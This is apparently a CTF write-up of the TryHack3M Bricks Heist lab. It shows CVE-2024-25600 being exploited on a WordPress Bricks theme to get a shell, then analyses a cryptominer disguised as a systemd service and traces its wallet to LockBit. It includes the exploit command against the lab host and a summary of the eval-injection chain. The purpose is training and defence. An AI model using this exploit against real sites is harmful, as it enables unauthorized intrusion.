# TryHack3M Bricks Heist - CTF Writeup

A comprehensive walkthrough of the TryHack3M Bricks Heist room featuring WordPress exploitation, cryptocurrency mining analysis, and ransomware investigation.

## 📋 Overview

This writeup demonstrates the complete solution path for the TryHack3M Bricks Heist CTF challenge, including:
- Network enumeration and service discovery
- WordPress vulnerability exploitation (CVE-2024-25600)
- System service analysis and process identification
- Cryptocurrency mining malware investigation
- Wallet address tracing and threat actor attribution

**Target:** `10.201.6.98`  
**Theme:** WordPress Bricks theme exploitation leading to RCE

---

## 🔍 Enumeration

### Initial Nmap Scan
```bash
nmap -A 10.201.6.98
```

![Nmap Scan Results](images/Pasted%20image%2020250809180727.png)

The initial scan revealed a WordPress installation with the "Brick by Brick" theme, strongly suggesting this is our primary attack vector given the room name "Brick".

### WordPress Enumeration
```bash
wpscan --url https://bricks.thm --disable-tls-checks
```

Running with TLS-checks won't work due to certificate issues.

![WPScan Results](images/Pasted%20image%2020250809181711.png)

Here's another reference to "brick" - let's see if this theme has any vulnerability.

Key findings:
- WordPress site running Bricks theme version 1.9.5
- TLS checks disabled due to certificate issues
- Identified potential vulnerability path

---

## 💥 Exploitation

### CVE-2024-25600: Bricks WordPress Theme RCE

After researching Bricks theme vulnerabilities for version 1.9.5, we identified **CVE-2024-25600** - a critical Remote Code Execution vulnerability affecting Bricks Builder versions ≤ 1.9.6.

**Vulnerability Details:**
- **CVE:** CVE-2024-25600
- **CVSS Score:** 10.0 (Critical)
- **Type:** Unauthenticated Remote Code Execution
- **Affected:** Bricks Builder ≤ 1.9.6
- **Root Cause:** Improper input validation in REST API endpoint

### Exploitation Tool

Using the exploit from: https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT

```bash
python CVE-2024-25600.py --url https://bricks.thm --threads 10
```

**Required Dependencies:**
```bash
pip install alive_progress bs4 prompt_toolkit requests rich
```

*Note: If installation fails, create a Python virtual environment first.*

### Gaining Shell Access

The exploit successfully provided an interactive shell environment:

![Shell Access](images/Pasted%20image%2020250809183224.png)

Running the above command gives us a RCE shell.

---

## 🎯 Flag Discovery

### First Flag
```bash
Shell> ls -la  
total 260  
drwxr-xr-x  7 apache apache  4096 Aug  9 12:34 .  
drwxr-xr-x  3 root   root    4096 Apr  2  2024 ..  
-rw-r--r--  1 apache apache   523 Apr  2  2024 .htaccess  
-rw-r--r--  1 root   root      43 Apr  5  2024 650c844110baced87e1606453b93f22a.txt  
-rw-r--r--  1 apache apache   405 Apr  2  2024 index.php  
drwxr-xr-x  7 apache apache  4096 Apr 12  2023 kod  
-rw-r--r--  1 apache apache 19915 Apr  4  2024 license.txt  
drwxr-xr-x 15 apache apache  4096 Apr  2  2024 phpmyadmin  
-rw-r--r--  1 apache apache  7401 Apr  4  2024 readme.html  
-rw-r--r--  1 apache apache  7387 Apr  4  2024 wp-activate.php  
drwxr-xr-x  9 apache apache  4096 Apr  2  2024 wp-admin  
-rw-r--r--  1 apache apache   351 Apr  2  2024 wp-blog-header.php  
-rw-r--r--  1 apache apache  2323 Apr  2  2024 wp-comments-post.php  
-rw-r--r--  1 apache apache  3012 Apr  4  2024 wp-config-sample.php  
-rw-rw-rw-  1 apache apache  3288 Apr  2  2024 wp-config.php  
drwxr-xr-x  6 apache apache  4096 Aug  9 12:34 wp-content  
-rw-r--r--  1 apache apache  5638 Apr  2  2024 wp-cron.php  
drwxr-xr-x 30 apache apache 16384 Apr  4  2024 wp-includes  
-rw-r--r--  1 apache apache  2502 Apr  2  2024 wp-links-opml.php  
-rw-r--r--  1 apache apache  3927 Apr  2  2024 wp-load.php  
-rw-r--r--  1 apache apache 50917 Apr  4  2024 wp-login.php  
-rw-r--r--  1 apache apache  8525 Apr  2  2024 wp-mail.php  
-rw-r--r--  1 apache apache 28427 Apr  4  2024 wp-settings.php  
-rw-r--r--  1 apache apache 34385 Apr  2  2024 wp-signup.php  
-rw-r--r--  1 apache apache  4885 Apr  2  2024 wp-trackback.php  
-rw-r--r--  1 apache apache  3246 Apr  4  2024 xmlrpc.php  

Shell> cat 650c844110baced87e1606453b93f22a.txt  
THM{fl46_650c844110baced87e1606453b93f22a}
```

**Flag 1:** `THM{fl46_650c844110baced87e1606453b93f22a}`

---

## 🔧 System Analysis

### Service Enumeration
```bash
Shell> systemctl | grep running  
 proc-sys-fs-binfmt_misc.automount                loaded active     running         Arbitrary Executable File Formats File System Automount Point                   
 acpid.path                                       loaded active     running         ACPI Events Check                                                               
 init.scope                                       loaded active     running         System and Service Manager                                                      
 session-c1.scope                                 loaded active     running         Session c1 of user lightdm                                                      
 accounts-daemon.service                          loaded active     running         Accounts Service                                                                
 acpid.service                                    loaded active     running         ACPI event daemon                                                               
 atd.service                                      loaded active     running         Deferred execution scheduler                                                    
 avahi-daemon.service                             loaded active     running         Avahi mDNS/DNS-SD Stack                                                         
 cron.service                                     loaded active     running         Regular background program processing daemon                                    
 cups-browsed.service                             loaded active     running         Make remote CUPS printers available locally                                     
 cups.service                                     loaded active     running         CUPS Scheduler                                                                  
 dbus.service                                     loaded active     running         D-Bus System Message Bus                                                        
 getty@tty1.service                               loaded active     running         Getty on tty1                                                                   
 httpd.service                                    loaded active     running         LSB: starts Apache Web Server                                                   
 irqbalance.service                               loaded active     running         irqbalance daemon                                                               
 kerneloops.service                               loaded active     running         Tool to automatically collect and submit kernel crash signatures                
 lightdm.service                                  loaded active     running         Light Display Manager                                                           
 ModemManager.service                             loaded active     running         Modem Manager                                                                   
 multipathd.service                               loaded active     running         Device-Mapper Multipath Device Controller                                       
 mysqld.service                                   loaded active     running         LSB: start and stop MySQL                                                       
 networkd-dispatcher.service                      loaded active     running         Dispatcher daemon for systemd-networkd                                          
 NetworkManager.service                           loaded active     running         Network Manager                                                                 
 polkit.service                                   loaded active     running         Authorization Manager                                                           
 rsyslog.service                                  loaded active     running         System Logging Service                                                          
 rtkit-daemon.service                             loaded active     running         RealtimeKit Scheduling Policy Service                                           
 serial-getty@ttyS0.service                       loaded active     running         Serial Getty on ttyS0                                                           
 snap.amazon-ssm-agent.amazon-ssm-agent.service   loaded active     running         Service for snap application amazon-ssm-agent.amazon-ssm-agent                  
 snapd.service                                    loaded active     running         Snap Daemon                                                                     
 ssh.service                                      loaded active     running         OpenBSD Secure Shell server                                                     
 switcheroo-control.service                       loaded active     running         Switcheroo Control Proxy service                                                
 systemd-journald.service                         loaded active     running         Journal Service                                                                 
 systemd-logind.service                           loaded active     running         Login Service                                                                   
 systemd-networkd.service                         loaded active     running         Network Service                                                                 
 systemd-resolved.service                         loaded active     running         Network Name Resolution                                                         
 systemd-timesyncd.service                        loaded active     running         Network Time Synchronization                                                    
 systemd-udevd.service                            loaded active     running         udev Kernel Device Manager                                                      
 ubuntu.service                                   loaded active     running         TRYHACK3M                                                                       
 udisks2.service                                  loaded active     running         Disk Manager                                                                    
 unattended-upgrades.service                      loaded active     running         Unattended Upgrades Shutdown                                                    
 upower.service                                   loaded active     running         Daemon for power management                                                     
 user@1000.service                                loaded active     running         User Manager for UID 1000                                                       
 user@114.service                                 loaded active     running         User Manager for UID 114                                                        
 whoopsie.service                                 loaded active     running         crash report submission daemon                                                  
 wpa_supplicant.service                           loaded active     running         WPA supplicant                                                                  
 acpid.socket                                     loaded active     running         ACPID Listen Socket                                                             
 avahi-daemon.socket                              loaded active     running         Avahi mDNS/DNS-SD Stack Activation Socket                                       
 cups.socket                                      loaded active     running         CUPS Scheduler                                                                  
 dbus.socket                                      loaded active     running         D-Bus System Message Bus Socket                                                 
 multipathd.socket                                loaded active     running         multipathd control socket                                                       
 snapd.socket                                     loaded active     running         Socket activation for snappy daemon                                             
 syslog.socket                                    loaded active     running         Syslog Socket                                                                   
 systemd-journald-audit.socket                    loaded active     running         Journal Audit Socket                                                            
 systemd-journald-dev-log.socket                  loaded active     running         Journal Socket (/dev/log)                                                       
 systemd-journald.socket                          loaded active     running         Journal Socket                                                                  
 systemd-networkd.socket                          loaded active     running         Network Service Netlink Socket                                                  
 systemd-udevd-control.socket                     loaded active     running         udev Control Socket                                                             
 systemd-udevd-kernel.socket                      loaded active     running         udev Kernel Socket
```

Among the running services, one stood out as suspicious:
```
ubuntu.service    loaded active running    TRYHACK3M
```

### Service Investigation
```bash
Shell> systemctl cat ubuntu.service  

# /etc/systemd/system/ubuntu.service  
[Unit]  
Description=TRYHACK3M  
  
[Service]  
Type=simple  
ExecStart=/lib/NetworkManager/nm-inet-dialog  
Restart=on-failure  
  
[Install]  
WantedBy=multi-user.target
```

**Key Finding:** The service description "TRYHACK3M" and the executable path `/lib/NetworkManager/nm-inet-dialog` indicate this is our target service for the mining instance.

---

## 🪙 Cryptocurrency Mining Investigation

### Malware Instance Discovery

The suspicious service points to `/lib/NetworkManager/nm-inet-dialog`. Further investigation of the NetworkManager directory revealed `inet.conf` as the mining configuration file.

![Mining Configuration](images/Pasted%20image%2020250809194008.png)

Now that we know `inet.conf` is the instance, let's find the associated wallet address.

### Wallet Address Extraction

The configuration file contained an encrypted wallet address. Using string extraction with cryptocurrency address patterns:

```bash
strings /lib/NetworkManager/inet.conf | grep -E '[13][a-km-zA-HJ-NP-Z1-9]{25,34}|4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}'
```

![Encrypted Wallet](images/Pasted%20image%2020250809195524.png)

The wallet address is encrypted, so we have to decode it:

```bash
echo 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d30453159556447  
6130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d | xxd -r -p | base64 -d
```

It needs to be decrypted again to get the actual wallet ID:

![Decoded Wallet](images/Pasted%20image%2020250809195850.png)

**Decoded Wallet Address:** `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`

### Blockchain Analysis

Using blockchain explorer (https://www.blockchain.com/explorer), we traced transactions from this wallet to identify the largest recipient:

![Blockchain Analysis](images/Pasted%20image%2020250809200057.png)

Then we can search for the receiver: `32pTjxTNi7snk8sodrgfmdKao3DEn1nVJM`

### Threat Actor Attribution

Searching this Bitcoin address in Google revealed:

![LockBit Attribution](images/Pasted%20image%2020250809200252.png)

As we can see, the group is **LockBit** - a notorious ransomware-as-a-service operation.

**Major Recipient:** `32pTjxTNi7snk8sodrgfmdKao3DEn1nVJM`

---

## 📊 Technical Analysis

### CVE-2024-25600 Exploitation Chain

1. **Initial Access:** Unauthenticated access to WordPress REST API endpoint `/bricks/v1/render_element`
2. **Permission Bypass:** Nonce-based authentication easily bypassed (nonce available in frontend)
3. **Code Injection:** User input passed to PHP `eval()` function without sanitization
4. **Remote Execution:** Arbitrary PHP code execution leading to system compromise

### Mining Malware Characteristics

- **Persistence:** Systemd service ensures automatic restart
- **Stealth:** Disguised as legitimate NetworkManager component  
- **Communication:** Encrypted configuration to evade detection
- **Monetization:** Direct mining to LockBit-controlled wallets

---

## 🛡️ Mitigation Strategies

### Immediate Actions
1. **Update Bricks Builder** to version 1.9.6.1 or later
2. **Remove malicious service:** `systemctl disable ubuntu.service`
3. **Clean mining artifacts** from `/lib/NetworkManager/`
4. **Audit system** for additional persistence mechanisms

### Long-term Security
1. **Regular WordPress Updates**
2. **Plugin Vulnerability Scanning**
3. **System Service Monitoring** 
4. **Network Traffic Analysis** for cryptocurrency mining patterns
5. **Endpoint Detection** for suspicious process behavior

---

## 🎯 Summary of Findings

### Flags Discovered
- **Flag 1:** `THM{fl46_650c844110baced87e1606453b93f22a}`
- **Suspicious Service:** `ubuntu.service` (Description: TRYHACK3M)
- **Mining Instance:** `/lib/NetworkManager/inet.conf`
- **Wallet Address:** `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`
- **Threat Actor:** LockBit Ransomware Group

---

## 🔗 References

- [CVE-2024-25600 Details](https://nvd.nist.gov/vuln/detail/CVE-2024-25600)
- [K3ysTr0K3R Exploit Repository](https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT)
- [Blockchain Explorer](https://www.blockchain.com/explorer)
- [LockBit Ransomware Analysis](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a)
- [WordPress Security Best Practices](https://wordpress.org/support/article/hardening-wordpress/)

---

## 📝 Key Takeaways

This challenge demonstrates:
1. **Critical WordPress vulnerabilities** can lead to complete system compromise
2. **Cryptocurrency mining malware** often masquerades as legitimate system services
3. **Blockchain analysis** can reveal threat actor attribution and financial infrastructure  
4. **Systematic enumeration** and analysis are crucial for complex attack chains
5. **Defense in depth** is essential for preventing and detecting such attacks

---

**Author:** Security Researcher  
**Date:** August 2025  
**Difficulty:** Intermediate  
**Tools Used:** Nmap, WPScan, CVE-2024-25600 Exploit, Systemctl, Blockchain Explorers

## 📁 Repository Structure

```
TryHack3M-Bricks-Heist/
├── README.md
├── images/
│   ├── Pasted image 20250809180727.png
│   ├── Pasted image 20250809181711.png
│   ├── Pasted image 20250809183224.png
│   ├── Pasted image 20250809194008.png
│   ├── Pasted image 20250809195524.png
│   ├── Pasted image 20250809195850.png
│   ├── Pasted image 20250809200057.png
│   └── Pasted image 20250809200252.png
└── exploits/
    └── CVE-2024-25600.py
```
